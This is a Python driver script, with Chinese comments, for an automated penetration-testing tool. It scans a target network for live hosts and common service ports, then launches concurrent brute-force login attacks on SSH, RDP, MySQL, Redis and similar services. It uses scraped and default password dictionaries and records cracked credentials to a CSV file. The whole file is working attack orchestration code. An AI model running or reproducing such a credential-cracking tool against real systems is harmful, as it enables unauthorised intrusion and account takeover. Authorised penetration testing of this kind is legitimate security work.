#!/usr/bin/env python3
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from scanner import scan_tools
from protocol_forces import PROTOCOL_MAP
from spider_dictionary import get_dict
from config import *
from utils import log, save_result_to_csv

def main():
    log("===== 自动化渗透测试工具启动 =====", "info")

    # 1. IP扫描
    scanner = scan_tools(TARGET_NETWORK)
    alive_hosts = scanner.scan_ip(max_workers=IP_SCAN_THREADS)
    log(f"发现 {len(alive_hosts)} 个存活主机", "info")

    # 2. 端口扫描（使用常用端口列表）
    port_list = [21, 22, 80, 443, 445, 3306, 3389, 6379, 8080, 8443]
    all_open_ports = {}
    for ip in alive_hosts:
        open_ports = scanner.scan_ports(ip, port_list, timeout=PORT_SCAN_TIMEOUT, max_workers=PORT_SCAN_THREADS)
        all_open_ports[ip] = open_ports
        log(f"{ip} 开放端口: {open_ports}", "info")

    # 3. 收集爆破任务
    tasks = []
    for ip, ports in all_open_ports.items():
        for port in ports:
            if port in PROTOCOL_MAP:
                tasks.append((ip, port))

    if not tasks:
        log("没有可爆破的端口，程序退出", "warning")
        return

    log(f"共 {len(tasks)} 个爆破任务", "info")

    # 4. 并发爆破 + 保存CSV
    with ThreadPoolExecutor(max_workers=BRUTE_THREADS) as executor:
        futures = []
        for ip, port in tasks:
            proto_name, brute_func = PROTOCOL_MAP[port]
            # 获取字典（第一次调用会爬取）
            user_dict = get_dict(proto_name.lower())
            pwd_dict = get_dict("default")  # 默认密码字典

            if not user_dict:
                user_dict = ["root", "admin"]  # 兜底
            if not pwd_dict:
                pwd_dict = ["123456", "password", "admin"]

            # 限制测试数量（演示用，实际可全量）
            user_sample = user_dict[:20]
            pwd_sample = pwd_dict[:20]

            future = executor.submit(brute_func, ip, port, user_sample, pwd_sample)
            futures.append((ip, port, proto_name, future))

        for ip, port, proto_name, future in futures:
            try:
                user, pwd = future.result()
                if user or pwd:
                    log(f"成功爆破 {ip}:{port} [{proto_name}] {user}:{pwd}", "success")
                    save_result_to_csv(ip, port, proto_name, "成功", user, pwd)
                else:
                    log(f"未找到弱口令 {ip}:{port} [{proto_name}]", "warning")
                    save_result_to_csv(ip, port, proto_name, "失败", "", "")
            except Exception as e:
                log(f"爆破异常 {ip}:{port}: {e}", "error")

    log("所有任务完成，结果已保存到 CSV", "success")

if __name__ == "__main__":
    main()
